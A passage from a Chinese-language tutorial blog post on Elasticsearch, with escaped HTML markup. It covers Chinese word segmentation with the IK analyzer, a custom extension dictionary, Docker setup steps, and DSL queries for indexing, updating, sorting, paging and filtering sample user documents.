</span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>结果如下：<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/14.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">POST /\\_analyze  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;text&quot;: &quot;中华人民共和国人民大会堂&quot;,  </span><br><span class=\"line\">  &quot;analyzer&quot;: &quot;standard&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"3-3-中文分词\"><a href=\"#3-3-中文分词\" class=\"headerlink\" title=\"3.3 中文分词\"></a><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/15.png\"><br>3.3 中文分词</h2><p>中文分词是中文文本处理的一个基础步骤，也是中文人机自然语言交互的基础模块。</p>\n<p>不同于英文的是，中文句子中没有词的界限，因此在进行中文自然语言处理时，通常需要先进行分词，</p>\n<p>分词效果将直接影响词性、句法树等模块的效果。</p>\n<p>当然分词只是一个工具，场景不同，要求也不同。</p>\n<p>部分分词工具如下：</p>\n<ul>\n<li><p>中科院计算所NLPIR <a href=\"http://ictclas.nlpir.org/nlpir/\">http://ictclas.nlpir.org/nlpir/</a></p>\n</li>\n<li><p>ansj分词器 <a href=\"https://github.com/NLPchina/ansj/_seg\">https://github.com/NLPchina/ansj\\_seg</a></p>\n</li>\n<li><p>哈工大的LTP <a href=\"https://github.com/HIT-SCIR/ltp\">https://github.com/HIT-SCIR/ltp</a></p>\n</li>\n<li><p>清华大学THULAC <a href=\"https://github.com/thunlp/THULAC\">https://github.com/thunlp/THULAC</a></p>\n</li>\n<li><p>斯坦福分词器 <a href=\"https://nlp.stanford.edu/software/segmenter.shtml\">https://nlp.stanford.edu/software/segmenter.shtml</a></p>\n</li>\n<li><p>Hanlp分词器 <a href=\"https://github.com/hankcs/HanLP\">https://github.com/hankcs/HanLP</a></p>\n</li>\n<li><p>结巴分词 <a href=\"https://github.com/yanyiwu/cppjieba\">https://github.com/yanyiwu/cppjieba</a></p>\n</li>\n<li><p>KCWS分词器(字嵌入+Bi-LSTM+CRF) <a href=\"https://github.com/koth/kcws\">https://github.com/koth/kcws</a></p>\n</li>\n<li><p>ZPar <a href=\"https://github.com/frcchang/zpar/releases\">https://github.com/frcchang/zpar/releases</a></p>\n</li>\n<li><p>IKAnalyzer <a href=\"https://github.com/wks/ik-analyzer\">https://github.com/wks/ik-analyzer</a></p>\n</li>\n</ul>\n<h2 id=\"3-4-IK分词器\"><a href=\"#3-4-IK分词器\" class=\"headerlink\" title=\"3.4 IK分词器\"></a>3.4 IK分词器</h2><p>IK分词器下载地址<a href=\"https://github.com/medcl/elasticsearch-analysis-ik/releases\">https://github.com/medcl/elasticsearch-analysis-ik/releases</a> 将ik分词器上传到服务器上，然后解压，并改名字为ik</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">mkdir ~/ik  </span><br><span class=\"line\">mv elasticsearch-analysis-ik-7.15.2.zip ~/ik  </span><br><span class=\"line\">unzip elasticsearch-analysis-ik-7.15.2.zip  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>将ik目录拷贝到docker容器的plugins目录下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">docker cp ./ik es:/usr/share/elasticsearch/plugins  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>特别说明，的一键启动版本，已经默认戴上了IK分词器</p>\n</blockquote>\n<p>IKAnalyzer是一个开源的，基于java语言开发的轻量级的中文分词工具包，IK分词器分为两种模式</p>\n<ol>\n<li><strong>ik_max_word：会将文本做最细粒度的拆分</strong></li>\n</ol>\n<p>比如会将“中华人民共和国人民大会堂”拆分为“中华人民共和国、中华人民、中华、华人、人民共和国、人民、共和国、大会堂、大会、会堂等词语。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">POST /\\_analyze  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">&quot;text&quot;:&quot;中华人民共和国人民大会堂&quot;,  </span><br><span class=\"line\">&quot;analyzer&quot;:&quot;ik\\_max\\_word&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/16.png\"><br>2.  <strong>ik_smart：会做最粗粒度的拆分</strong></p>\n<p>比如会将“中华人民共和国人民大会堂”拆分为中华人民共和国、人民大会堂。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">POST /\\_analyze  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;text&quot;: &quot;中华人民共和国人民大会堂&quot;,  </span><br><span class=\"line\">  &quot;analyzer&quot;: &quot;ik\\_smart&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"3-5-自定义扩展字典\"><a href=\"#3-5-自定义扩展字典\" class=\"headerlink\" title=\"3.5 自定义扩展字典\"></a><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/17.png\"><br>3.5 自定义扩展字典</h2><p>IK分词器的两种模式的最佳实践是：索引时用ik_max_word，搜索时用ik_smart，索引时最大化的将文章内容分词，搜索时更精确的搜索到想要的结果。</p>\n<p>举个例子：用户输入“华为手机”搜索，此时应该搜索出“华为手机”的商品，而不是“华为”和“手机”这两个词，这样会搜索出华为其它的商品，</p>\n<p>此时使用ik_smart和ik_max_word都会将华为手机拆分为华为和手机两个词，那些只包括“华为”这个词的信息也被搜索出来了，我的目标是搜索只包含华为手机这个词的信息，这没有满足我的目标。</p>\n<p>ik_smart默认情况下分词“华为手机”，依然会分成两个词“华为”和“手机”，这时需要使用自定义扩展字典</p>\n<ol>\n<li><strong>进入es</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">docker exec -it es /bin/bash  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li><strong>增加自定义字典文件</strong></li>\n</ol>\n<p>如果容器编辑乱码，可以在宿主机编辑，然后拷贝到容器中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#进入ik配置目录  </span><br><span class=\"line\">cd plugins/ik/config/  </span><br><span class=\"line\">vi new\\_word.dic  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>内容如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">老铁  </span><br><span class=\"line\">王者荣耀  </span><br><span class=\"line\">洪荒之力  </span><br><span class=\"line\">共有产权房  </span><br><span class=\"line\">一带一路  </span><br><span class=\"line\">java日知录  </span><br><span class=\"line\">华为手机  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><strong>修改配置文件</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">vi IKAnalyzer.cfg.xml  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>内容如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  </span><br><span class=\"line\">&lt;!DOCTYPE properties SYSTEM &quot;http://java.sun.com/dtd/properties.dtd&quot;\\&gt;  </span><br><span class=\"line\">&lt;properties&gt;  </span><br><span class=\"line\">        &lt;comment&gt;IK Analyzer 扩展配置&lt;/comment&gt;  </span><br><span class=\"line\">        &lt;!--用户可以在这里配置自己的扩展字典 --&gt;  </span><br><span class=\"line\">        &lt;entry key=&quot;ext\\_dict&quot;\\&gt;new\\_word.dic&lt;/entry&gt;  </span><br><span class=\"line\">         &lt;!--用户可以在这里配置自己的扩展停止词字典--&gt;  </span><br><span class=\"line\">        &lt;entry key=&quot;ext\\_stopwords&quot;\\&gt;&lt;/entry&gt;  </span><br><span class=\"line\">        &lt;!--用户可以在这里配置远程扩展字典 --&gt;  </span><br><span class=\"line\">        &lt;!-- &lt;entry key=&quot;remote\\_ext\\_dict&quot;\\&gt;words\\_location&lt;/entry&gt; --&gt;  </span><br><span class=\"line\">        &lt;!--用户可以在这里配置远程扩展停止词字典--&gt;  </span><br><span class=\"line\">        &lt;!-- &lt;entry key=&quot;remote\\_ext\\_stopwords&quot;\\&gt;words\\_location&lt;/entry&gt; --&gt;  </span><br><span class=\"line\">&lt;/properties&gt;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li><strong>拷贝到宿主机</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">docker cp es:/usr/share/elasticsearch/plugins/elasticsearch-analysis-ik/config ~/ik  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li><strong>重启</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">docker restart es  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"4-高级的DSL-查询\"><a href=\"#4-高级的DSL-查询\" class=\"headerlink\" title=\"4 高级的DSL 查询\"></a>4 高级的DSL 查询</h1><p>前面介绍了基础的DSL查询，接下来，介绍一下高级的DSL 查询</p>\n<p>ES提供基于DSL(Domain Specific Language)的索引查询模式，</p>\n<p>DSL查询基于JSON定义查询</p>\n<p>Wikipedia对于DSL的定义”<strong>为了解决某一类任务而专门设计的计算机语言”</strong></p>\n<p>大师Martin Fowler对于DSL定义“<strong>DSL 通过在表达能力上做的妥协换取在某一领域内的高效</strong>”</p>\n<p>我们在使用ES的时候，避免不了使用DSL语句去查询，就像使用关系型数据库的时候要学会SQL语法一样。</p>\n<p>如果我们学习好了DSL语法的使用，那么在日后使用和使用Java Client调用时候也会变得非常简单。</p>\n<p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/18.png\"></p>\n<blockquote>\n<p>Elasticsearch provides a full Query DSL (Domain Specific Language) based on JSON to define queries. Think of the Query DSL as an AST (Abstract Syntax Tree) of queries</p>\n</blockquote>\n<h2 id=\"4-1-管理索引\"><a href=\"#4-1-管理索引\" class=\"headerlink\" title=\"4.1 管理索引\"></a>4.1 管理索引</h2><p>查看所有的索引</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">GET \\_cat/indices?v  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/19.png\"></p>\n<ol>\n<li><strong>删除某个索引</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">DELETE /skuinfo  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li><strong>新增索引</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">PUT /user  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><strong>创建映射</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">PUT /user/\\_mapping  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;properties&quot;: &#123;  </span><br><span class=\"line\">    &quot;name&quot;:&#123;  </span><br><span class=\"line\">      &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">      &quot;analyzer&quot;: &quot;ik\\_smart&quot;,  </span><br><span class=\"line\">      &quot;search\\_analyzer&quot;: &quot;ik\\_smart&quot;  </span><br><span class=\"line\">    &#125;,  </span><br><span class=\"line\">    &quot;city&quot;:&#123;  </span><br><span class=\"line\">      &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">      &quot;analyzer&quot;: &quot;ik\\_smart&quot;,  </span><br><span class=\"line\">      &quot;search\\_analyzer&quot;: &quot;ik\\_smart&quot;  </span><br><span class=\"line\">    &#125;,  </span><br><span class=\"line\">    &quot;age&quot;:&#123;  </span><br><span class=\"line\">      &quot;type&quot;: &quot;long&quot;  </span><br><span class=\"line\">    &#125;,  </span><br><span class=\"line\">    &quot;description&quot;:&#123;  </span><br><span class=\"line\">      &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">      &quot;analyzer&quot;: &quot;ik\\_smart&quot;,  </span><br><span class=\"line\">      &quot;search\\_analyzer&quot;: &quot;ik\\_smart&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li><strong>新增文档数据</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">PUT /user/\\_doc/1  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;李四&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:22,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;深圳&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;李四来自湖北武汉！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>再增加几条记录：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#新增文档数据 id=2  </span><br><span class=\"line\">PUT /user/\\_doc/2  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;王五&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:35,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;深圳&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;王五家住在深圳！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#新增文档数据 id=3  </span><br><span class=\"line\">PUT /user/\\_doc/3  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;张三&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:19,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;深圳&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;在深圳打工，来自湖北武汉&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#新增文档数据 id=4  </span><br><span class=\"line\">PUT /user/\\_doc/4  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;张三丰&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:66,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;武汉&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;在武汉读书，家在武汉！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#新增文档数据 id=5  </span><br><span class=\"line\">PUT /user/\\_doc/5  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;赵子龙&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:77,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;广州&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;赵子龙来自深圳宝安，但是在广州工作！&quot;,  </span><br><span class=\"line\">  &quot;address&quot;:&quot;广东省茂名市&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#新增文档数据 id=6  </span><br><span class=\"line\">PUT /user/\\_doc/6  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;赵毅&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:55,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;广州&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;赵毅来自广州白云区，从事电子商务8年！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">#新增文档数据 id=7  </span><br><span class=\"line\">PUT /user/\\_doc/7  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;赵哈哈&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:57,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;武汉&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;武汉赵哈哈，在深圳打工已有半年了，月薪7500！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li><strong>修改数据</strong></li>\n</ol>\n<p><strong>（1）操作1</strong></p>\n<p>更新数据可以使用之前的增加操作,这种操作会将整个数据替换掉，代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#更新数据,id=4  </span><br><span class=\"line\">PUT /user/\\_doc/4  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;张三丰&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;在武汉读书，家在武汉！在深圳工作！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>使用GET命令查看：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#根据ID查询  </span><br><span class=\"line\">GET /user/\\_doc/4  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><strong>（2）操作2</strong></p>\n<p>我们先使用下面命令恢复数据：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#恢复文档数据 id=4  </span><br><span class=\"line\">PUT /user/\\_doc/4  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;name&quot;:&quot;张三丰&quot;,  </span><br><span class=\"line\">  &quot;age&quot;:66,  </span><br><span class=\"line\">  &quot;city&quot;:&quot;武汉&quot;,  </span><br><span class=\"line\">  &quot;description&quot;:&quot;在武汉读书，家在武汉！&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>使用POST更新某个列的数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#使用POST更新某个域的数据  </span><br><span class=\"line\">POST /user/\\_doc/4  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;doc&quot;:&#123;  </span><br><span class=\"line\">    &quot;name&quot;:&quot;张三丰&quot;,  </span><br><span class=\"line\">    &quot;description&quot;:&quot;在武汉读书，家在武汉！在深圳工作！&quot;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li><strong>删除Document</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#删除数据  </span><br><span class=\"line\">DELETE user/userinfo/7  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"4-2-数据查询\"><a href=\"#4-2-数据查询\" class=\"headerlink\" title=\"4.2 数据查询\"></a>4.2 数据查询</h2><ol>\n<li><strong>查询所有数据</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#查询所有  </span><br><span class=\"line\">GET /user/\\_search  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li><strong>根据ID查询</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#根据ID查询  </span><br><span class=\"line\">GET /user/\\_doc/2  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><strong>Sort排序</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#搜索排序  </span><br><span class=\"line\">GET /user/\\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;:&#123;  </span><br><span class=\"line\">    &quot;match\\_all&quot;: &#123;&#125;  </span><br><span class=\"line\">  &#125;,  </span><br><span class=\"line\">  &quot;sort&quot;:&#123;  </span><br><span class=\"line\">    &quot;age&quot;:&#123;  </span><br><span class=\"line\">      &quot;order&quot;:&quot;desc&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li><strong>分页</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#分页实现  </span><br><span class=\"line\">GET /user/\\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;:&#123;  </span><br><span class=\"line\">    &quot;match\\_all&quot;: &#123;&#125;  </span><br><span class=\"line\">  &#125;,  </span><br><span class=\"line\">  &quot;sort&quot;:&#123;  </span><br><span class=\"line\">    &quot;age&quot;:&#123;  </span><br><span class=\"line\">      &quot;order&quot;:&quot;desc&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;,  </span><br><span class=\"line\">  &quot;from&quot;: 0,  </span><br><span class=\"line\">  &quot;size&quot;: 2  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>from:从下N的记录开始查询</p>\n</li>\n<li><p>size:每页显示条数</p>\n</li>\n</ul>\n<h2 id=\"4-3-查询模式\"><a href=\"#4-3-查询模式\" class=\"headerlink\" title=\"4.3 查询模式\"></a>4.3 查询模式</h2><ol>\n<li><strong>term查询</strong></li>\n</ol>\n<p>term主要用于分词精确匹配，如字符串、数值、日期等（不适合情况：1.列中除英文字符外有其它值 2.字符串值中有冒号或中文 3.系统自带属性如_version）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#查询-term  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;:&#123;  </span><br><span class=\"line\">    &quot;term&quot;:&#123;  </span><br><span class=\"line\">      &quot;city&quot;:&quot;武汉&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li><strong>terms 查询</strong></li>\n</ol>\n<p>terms 跟 term 有点类似，但 terms 允许指定多个匹配条件。 如果某个字段指定了多个值，那么文档需要一起去做匹配 。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#查询-terms 允许多个Term  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;:&#123;  </span><br><span class=\"line\">    &quot;terms&quot;:&#123;  </span><br><span class=\"line\">      &quot;city&quot;:  </span><br><span class=\"line\">        \\[  </span><br><span class=\"line\">          &quot;武汉&quot;,  </span><br><span class=\"line\">          &quot;广州&quot;  </span><br><span class=\"line\">        \\]  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><strong>match查询</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;match&quot;: &#123;  </span><br><span class=\"line\">      &quot;city&quot;: &quot;广州武汉&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li><strong>query_string查询</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">    &quot;query\\_string&quot;: &#123;  </span><br><span class=\"line\">      &quot;default\\_field&quot;: &quot;city&quot;,  </span><br><span class=\"line\">      &quot;query&quot;: &quot;广州武汉&quot;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li><strong>range 查询</strong></li>\n</ol>\n<p>range过滤允许我们按照指定范围查找一批数据。例如我们查询年龄范围</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#-range 范围过滤  </span><br><span class=\"line\">#gt表示&gt; gte表示=&gt;  </span><br><span class=\"line\">#lt表示&lt; lte表示&lt;=  </span><br><span class=\"line\">GET \\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;query&quot;:&#123;  </span><br><span class=\"line\">    &quot;range&quot;: &#123;  </span><br><span class=\"line\">      &quot;age&quot;: &#123;  </span><br><span class=\"line\">        &quot;gte&quot;: 30,  </span><br><span class=\"line\">        &quot;lte&quot;: 57  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol 